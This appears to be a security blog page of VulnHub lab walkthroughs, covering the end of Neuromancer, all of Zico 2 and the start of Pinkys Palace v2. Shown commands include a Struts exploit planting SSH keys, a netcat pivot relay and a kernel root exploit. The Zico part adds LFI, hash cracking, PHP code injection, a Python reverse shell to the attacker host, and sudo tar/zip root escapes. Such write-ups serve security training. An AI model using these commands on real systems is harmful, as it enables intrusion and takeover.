qzrejm2z42DSE356qkY2I4+2xLoHtfQiIAVPl5p9YGcjwDs4NWeYFRZ8RbMYnW7pVD6Bj+hQedOn9uPM+wm1dUh+ZiEwgGFSeeKWvfR7N0LQ69+YhK0gAPY//6NiK300UFpGWW6D+RNyAq9+3zovqini3XPfnfLrhHtG
vMbuN4Yzp9+g8N7Pz8nWXBLo/V3Yufxw99j7y3Rwj4LUVrGqWi7HUkQFSK/kIzUU81wJ54x+JrtToBuXIFl57fXz23NfBLsJMIIjYykTmbUGaTDWpmm2fRoCMdGQmr3EASDpvzuZSNsvVr5wqCSQ0CrJ3+NM3sKEqwZR
ItFaad4mhE= &gt; /home/ta/.ssh/authorized_keys"</span>
</code></pre></div></div>

<p>We grant read and write permissions to the owner of the authorized_keys file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action <span class="s2">"chmod 600 /home/ta/.ssh/authorized_keys"</span>
</code></pre></div></div>

<p>We execute the following commands to set up a netcat relay to pivot as shown previously.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@straylight:/root# <span class="nb">mknod</span> /tmp/backpipe2 p
root@straylight:/root# nc <span class="nt">-lp</span> 34483 &lt; /tmp/backpipe2 | nc 192.168.56.104 34483 <span class="o">&gt;</span> /tmp/backpipe2
</code></pre></div></div>

<p>We access via SSH as user ta.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> ta 192.168.56.104 <span class="nt">-p</span> 34483 <span class="nt">-i</span> id_rsa
The authenticity of host <span class="s1">'[192.168.56.104]:34483 ([192.168.56.104]:34483)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:oUL2wjfAFRqayjqOgc79xVYeSqvD92zqaV+4udNxJrw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="o">[</span>192.168.56.104]:34483<span class="s1">' (ECDSA) to the list of known hosts.
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
Enter passphrase for key '</span>id_rsa<span class="s1">': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
44 updates are security updates.


Last login: Tue Jul  3 21:53:25 2018
ta@neuromancer:~$
</span></code></pre></div></div>

<p>We execute the find command to locate the tomcat-users.xml file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ta@neuromancer:/<span class="nv">$ </span>find / <span class="nt">-name</span> <span class="s1">'tomcat-users.xml'</span> 2&gt;/dev/null | xargs <span class="nb">cat</span>
...
&lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">"Lady3Jane"</span> <span class="nv">password</span><span class="o">=</span><span class="s2">"&amp;gt;&amp;#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;"</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">"manager-gui"</span>/&gt;
...
</code></pre></div></div>

<p>As we can see, Lady3Jane’s password is encoded in HTML, we decode to plain text using the hURL utility.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hURL <span class="nt">-h</span> <span class="s2">"&amp;gt;&amp;#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;"</span>

Original     :: &amp;gt<span class="p">;</span>&amp;#33<span class="p">;</span>&amp;#88<span class="p">;</span>&amp;#120<span class="p">;</span>&amp;#51<span class="p">;</span>&amp;#74<span class="p">;</span>&amp;#97<span class="p">;</span>&amp;#110<span class="p">;</span>&amp;#101<span class="p">;</span>&amp;#120<span class="p">;</span>&amp;#88<span class="p">;</span>&amp;#33<span class="p">;</span>&amp;lt<span class="p">;</span>
HTML DEcoded :: <span class="o">&gt;!</span>Xx3JanexX!&lt;
</code></pre></div></div>

<p>We change to the user lady3jane.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ta@neuromancer:/<span class="nv">$ </span>su - lady3jane
Password: 
lady3jane@neuromancer:~<span class="nv">$ </span><span class="nb">ls
</span>custom-tomcat-chk.sh
</code></pre></div></div>

<p>We see a bash script in the home directory, I thought this script was being executed by a cron job, a way to escalate privileges, but it was not possible.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lady3jane@neuromancer:~<span class="nv">$ </span><span class="nb">cat </span>custom-tomcat-chk.sh 
<span class="c">#!/bin/bash</span>
<span class="c"># Health check for Neuromancer (root) to execute every 3 minutes.</span>
<span class="c"># ..the AI tells me it can maintain security, server health, etc w/o forced intervention,</span>
<span class="c"># but I beg to differ...hence the cron script.</span>

<span class="o">&gt;</span> /tmp/tomcat_status.log

<span class="nv">health</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-m</span> 5 <span class="nt">-Is</span> 127.0.0.1:8080 |grep HTTP/1.1<span class="si">)</span>

<span class="k">case</span> <span class="s2">"</span><span class="nv">$health</span><span class="s2">"</span> <span class="k">in</span>

  <span class="k">*</span>200<span class="k">*</span><span class="p">)</span>
        <span class="nb">echo</span> <span class="s2">"Tomcat is Up"</span> <span class="o">&gt;</span> /tmp/tomcat_status.log
        <span class="p">;;</span>
  <span class="k">*</span><span class="p">)</span>
        <span class="nb">echo</span> <span class="s2">"Tomcat is down"</span> <span class="o">&gt;</span> /tmp/tomcat_status.log
        <span class="p">;;</span>
  <span class="k">esac</span>

lady3jane@neuromancer:~<span class="err">$</span>
</code></pre></div></div>

<p>Another way is to find a kernel exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ta@neuromancer:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ta<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ta<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>ta<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>

ta@neuromancer:~<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
Linux neuromancer 4.4.0-116-generic <span class="c">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div></div>

<p>A possible kernel exploit for this version in the following.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit 4.4.0
<span class="nt">-------------------------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
 Exploit Title                                                                 |  Path                         
<span class="nt">-------------------------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
...
Linux Kernel &lt; 4.4.0-116 <span class="o">(</span>Ubuntu 16.04.4<span class="o">)</span> - Local Privilege Escalation         | linux/local/44298.c
...
<span class="nt">-------------------------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
</code></pre></div></div>

<p>We copy the exploit to our current directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/local/44298.c
</code></pre></div></div>

<p>We compile the exploit on the attacking machine since gcc is not installed on the victim machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gcc 44298.c <span class="nt">-o</span> exp
</code></pre></div></div>

<p>We transfer the exploit to the victim machine via SSH.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>scp <span class="nt">-i</span> id_rsa <span class="nt">-P</span> 34483 exp ta@192.168.56.104:exp  
 <span class="nt">----------------------------------------------------------------</span>
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 <span class="nt">----------------------------------------------------------------</span>
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
exp
</code></pre></div></div>

<p>We grant execution privileges to the compiled exploit, execute it, and we get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ta@neuromancer:~<span class="nv">$ </span><span class="nb">chmod </span>755 exp 
ta@neuromancer:~<span class="nv">$ </span>./exp 
task_struct <span class="o">=</span> ffff88000af43800
uidptr <span class="o">=</span> ffff88000c915484
spawning root shell
root@neuromancer:~# <span class="nb">cd</span> /root/
root@neuromancer:/root# <span class="nb">ls
</span>flag.txt  struts2  velocity.log
root@neuromancer:/root# <span class="nb">cat </span>flag.txt 
be3306f431dae5ebc93eebb291f4914a
root@neuromancer:/root#
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Zico 2</h1>
	<p class="post-date text-bold text-upcase">
	<span>December 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> A Boot2Root Machine intended to simulate a real world scenario</p>

<p><strong>Author:</strong> Rafael</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root and read the flag file.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/zico2-1,210/">https://www.vulnhub.com/entry/zico2-1,210/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>A ping scan on the local network discovered the target host, the script you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.179 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>The full TCP scan with nmap discovered four open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.179 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
47159/tcp open  unknown
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>In order to discover more information about the available services, an aggressive scan was performed with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-p22</span>,80,111,47159 192.168.179.179 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION                                           
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:                                                      
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 <span class="o">(</span>DSA<span class="o">)</span>     
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 <span class="o">(</span>RSA<span class="o">)</span>         
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 <span class="o">(</span>ECDSA<span class="o">)</span>   
80/tcp    open  http    Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>        
| http-methods:                                      
|_  Supported Methods: OPTIONS GET HEAD POST            
|_http-server-header: Apache/2.2.22 <span class="o">(</span>Ubuntu<span class="o">)</span>    
|_http-title: Zico<span class="s1">'s Shop                      
111/tcp   open  rpcbind 2-4 (RPC #100000)      
| rpcinfo:                                    
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33465/udp   status 
|   100024  1          40806/tcp6  status 
|   100024  1          47159/tcp   status 
|_  100024  1          60683/udp6  status 
47159/tcp open  status  1 (RPC #100024)
...
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>In The web service we can see a shop web page.</p>

<p><img src="/assets/images/zico2/screenshot-1.png" alt="" /></p>

<p>Browsing I found that the <strong>page</strong> parameter is including an HTML file.</p>

<p><img src="/assets/images/zico2/screenshot-2.png" alt="" /></p>

<p>By attempt to include the system password file was detected that is vulnerable to Local File Inclusion.</p>

<p><img src="/assets/images/zico2/screenshot-3.png" alt="" /></p>

<p>A quick enumeration with dirb found the <strong>dbadmin</strong> directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirb http://192.168.179.179 <span class="nt">-r</span>
...
<span class="nt">----</span> Scanning URL: http://192.168.179.179/ <span class="nt">----</span>
+ http://192.168.179.179/cgi-bin/ <span class="o">(</span>CODE:403|SIZE:291<span class="o">)</span>  
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/css/          
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/dbadmin/      
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/img/        
+ http://192.168.179.179/index <span class="o">(</span>CODE:200|SIZE:7970<span class="o">)</span>  
+ http://192.168.179.179/index.html <span class="o">(</span>CODE:200|SIZE:7970<span class="o">)</span> 
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/js/             
+ http://192.168.179.179/LICENSE <span class="o">(</span>CODE:200|SIZE:1094<span class="o">)</span>  
+ http://192.168.179.179/package <span class="o">(</span>CODE:200|SIZE:789<span class="o">)</span>  
+ http://192.168.179.179/server-status <span class="o">(</span>CODE:403|SIZE:296<span class="o">)</span>
+ http://192.168.179.179/tools <span class="o">(</span>CODE:200|SIZE:8355<span class="o">)</span>   
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.179/vendor/     
+ http://192.168.179.179/view <span class="o">(</span>CODE:200|SIZE:0<span class="o">)</span>
</code></pre></div></div>

<p>We access this and find a link, and click on it.</p>

<p><img src="/assets/images/zico2/screenshot-4.png" alt="" /></p>

<p>This contains a login form, we login entering <strong>admin</strong> as password.</p>

<p><img src="/assets/images/zico2/screenshot-5.png" alt="" /></p>

<p><img src="/assets/images/zico2/screenshot-6.png" alt="" /></p>

<p>By browsing, two users were found with their respective password hashes.</p>

<p><img src="/assets/images/zico2/screenshot-7.png" alt="" /></p>

<p>We copy the password hashes to a file, and crack it with hashcat.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"96781A607F4E9F5F423AC01F0DAB0EBD</span><span class="se">\n</span><span class="s2">653F4B285089453FE00E2AAFAC573414"</span> <span class="o">&gt;</span> hashes.phplite
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> rockyou.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 0 hashes.phplite rockyou.txt
...
96781a607f4e9f5f423ac01f0dab0ebd:zico2215@
653f4b285089453fe00e2aafac573414:34kroot34 
</code></pre></div></div>

<p>In seconds hashcat managed to crack the MD5 hashes, with this credentials it was not possible to access to the server via SSH.</p>

<p>A Remote Code Injection vulnerability was discovered for phpLiteAdmin 1.9.3.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit phpliteadmin 1.9.3                            
<span class="nt">-----------------------------------------------------------</span> <span class="nt">-------------------------</span>
 Exploit Title                                             |  Path
<span class="nt">-----------------------------------------------------------</span> <span class="nt">-------------------------</span>
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection             | php/webapps/24044.txt
<span class="nt">-----------------------------------------------------------</span> <span class="nt">-------------------------</span>
</code></pre></div></div>

<p>We copy the exploit to our current directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/24044.txt
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="remote-php-code-injection">Remote PHP Code Injection</h3>

<p>We follow the instructions described in the exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>24044.txt
...
Proof of Concept:

1. We create a db named <span class="s2">"hack.php"</span><span class="nb">.</span>
<span class="o">(</span>Depending on Server configuration sometimes it will not work and the name <span class="k">for </span>the db will be <span class="s2">"hack.sqlite"</span><span class="nb">.</span> Then simply try to rename the database / existing database to <span class="s2">"hack.php"</span>.<span class="o">)</span>
The script will store the sqlite database <span class="k">in </span>the same directory as phpliteadmin.php.
Preview: http://goo.gl/B5n9O
Hex preview: http://goo.gl/lJ5iQ

2. Now create a new table <span class="k">in </span>this database and insert a text field with the default value:
&lt;?php phpinfo<span class="o">()</span>?&gt;
Hex preview: http://goo.gl/v7USQ

3. Now we run hack.php
</code></pre></div></div>

<p>We create a database called <strong>hack.php</strong>.</p>

<p><img src="/assets/images/zico2/screenshot-8.png" alt="" /></p>

<p>We create a table called <strong>lite</strong> that will contain a column called <strong>input</strong>.</p>

<p><img src="/assets/images/zico2/screenshot-9.png" alt="" /></p>

<p><img src="/assets/images/zico2/screenshot-10.png" alt="" /></p>

<p>We insert a web shell into the <strong>input</strong> column.</p>

<p><img src="/assets/images/zico2/screenshot-11.png" alt="" /></p>

<p>Using the LFI vulnerability we can include the <strong>hack.php</strong> database, to execute the <strong>whoami</strong> command.</p>

<p><img src="/assets/images/zico2/screenshot-12.png" alt="" /></p>

<p>We need to set up a netcat listener on port 443, and run the following python reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.179.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span>
</code></pre></div></div>

<p><img src="/assets/images/zico2/screenshot-13.png" alt="" /></p>

<p>We have a shell with user privileges <strong>www-data</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.179] 55927
www-data@zico:/var/www<span class="err">$</span>
</code></pre></div></div>

<p>Listing the wordpress config file in the zico’s home directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@zico:/home/zico/wordpress<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-40</span> wp-config.php
<span class="nb">head</span> <span class="nt">-40</span> wp-config.php
...
// <span class="k">**</span> MySQL settings - You can get this info from your web host <span class="k">**</span> //
/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'zico'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database username <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'zico'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database password <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'sWfCsfJSPV9H3AmQzw8'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'zico'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> Database Charset to use <span class="k">in </span>creating database tables. <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_CHARSET'</span>, <span class="s1">'utf8'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> The Database Collate type. Don<span class="s1">'t change this if in doubt. */
define('</span>DB_COLLATE<span class="s1">', '');
</span></code></pre></div></div>

<p>We reuse the wordpress password to login as user zico.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@zico:/home/zico<span class="nv">$ </span>su zico
su zico
Password: sWfCsfJSPV9H3AmQzw8

zico@zico:~<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>zico<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>zico<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>zico<span class="o">)</span>
</code></pre></div></div>

<p>The zico user has sudo privileges to run the tar and zip binaries, we’ll use the both to get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zico@zico:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>zico on this host:
    env_reset, <span class="nv">exempt_group</span><span class="o">=</span>admin,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User zico may run the following commands on this host:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/tar
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/zip
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>To get root via tar we execute the following command which will run /bin/bash on every checkpoint, this method was extracted from <a href="https://gtfobins.github.io/gtfobins/tar/#sudo">GTFOBINS</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zico@zico:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/tar <span class="nt">-cf</span> /dev/null /dev/null <span class="nt">--checkpoint</span><span class="o">=</span>1 <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>/bin/bash
&lt;<span class="nt">-cf</span> /dev/null /dev/null <span class="nt">--checkpoint</span><span class="o">=</span>1 <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>/bin/bash   
/bin/tar: Removing leading <span class="sb">`</span>/<span class="s1">' from member names
root@zico:~#
</span></code></pre></div></div>

<p>We execute the following zip command to get root, this topic was obtained from <a href="https://gtfobins.github.io/gtfobins/zip/#sudo">GTFOBINS</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zico@zico:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/zip /dev/null /etc/sudoers <span class="nt">-T</span> <span class="nt">-TT</span> <span class="s1">'bash #'</span>
<span class="nb">sudo</span> /usr/bin/zip /dev/null /etc/sudoers <span class="nt">-T</span> <span class="nt">-TT</span> <span class="s1">'bash #'</span>
  adding: etc/sudoers <span class="o">(</span>deflated 49%<span class="o">)</span>
root@zico:~#
</code></pre></div></div>

<p>And finally we read the root flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@zico:~# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
root@zico:/root# <span class="nb">ls 
ls
</span>flag.txt
root@zico:/root# <span class="nb">cat </span>flag.txt
<span class="nb">cat </span>flag.txt
<span class="c">#</span>
<span class="c">#</span>
<span class="c">#</span>
<span class="c"># ROOOOT!</span>
<span class="c"># You did it! Congratz!</span>
<span class="c"># </span>
<span class="c"># Hope you enjoyed! </span>
<span class="c"># </span>
<span class="c"># </span>
<span class="c">#</span>
<span class="c">#</span>
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Pinkys Palace v2</h1>
	<p class="post-date text-bold text-upcase">
	<span>December 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> A realistic Boot2Root.</p>

<p><strong>Author:</strong> Pink_Panther</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> Gain access to the system and read the /root/root.txt.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/pinkys-palace-v2,229/">https://www.vulnhub.com/entry/pinkys-palace-v2,229/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>A ping scan on the local network discovered the target machine, the script can be found <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.178 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>With the aim of revealing open ports a full TCP port scan was performed.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T4</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> 192.168.179.178 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE    SERVICE
80/tcp    open     http
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>As we know, that only port 80 is open, we proceed to get more information about this port.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p80</span> 192.168.179.178 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>For a correct resolution of the web page, we add the following instruction to the hosts file on the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'192.168.179.178 pinkydb'</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>

<p>Now, We can browse in the web page, it’s a wordpress.</p>

<p><img src="/assets/images/pinkysv2/screenshot-1.png" alt="" /></p>

<p>With wpscan we can do an additional enumeration in wordpress to detect vulnerable plugins and themes, as well as existing users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://pinkydb/ <span class="nt">-e</span> vp,vt,u
...
<span class="o">[</span>+] XML-RPC seems to be enabled: http://pinkydb/xmlrpc.php    
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>             
 | Confidence: 100%
 ...
 <span class="o">[</span>+] WordPress version 4.9.4 identified <span class="o">(</span>Insecure, released on 2018-02-06<span class="o">)</span><span class="nb">.</span>
 | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 ...
<span class="o">[</span>+] WordPress version 4.9.4 identified <span class="o">(</span>Insecure, released on 2018-02-06<span class="o">)</span><span class="nb">.</span>  
 | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>                             
 |  - http://pinkydb/?feed<span class="o">=</span>rss2, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>4.9.4&lt;/generator&gt; 
 |  - http://pinkydb/?feed<span class="o">=</span>comments-rss2, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>4.9.4&lt;/generator&gt;
...
<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+] pinky1337
 | Found By: Author Posts - Display Name <span class="o">(</span>Passive Detection<span class="o">)</span>
 ...
</code></pre></div></div>

<p>This reveals the wordpress version and a user, with the objective of discovering more information, I ran dirb to find hidden web content.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirb http://pinkydb 
...
<span class="nt">----</span> Scanning URL: http://pinkydb/ <span class="nt">----</span>
+ http://pinkydb/index.php <span class="o">(</span>CODE:301|SIZE:0<span class="o">)</span>
<span class="o">==&gt;</span> DIRECTORY: http://pinkydb/secret/     
+ http://pinkydb/server-status <span class="o">(</span>CODE:403|SIZE:295<span class="o">)</span>
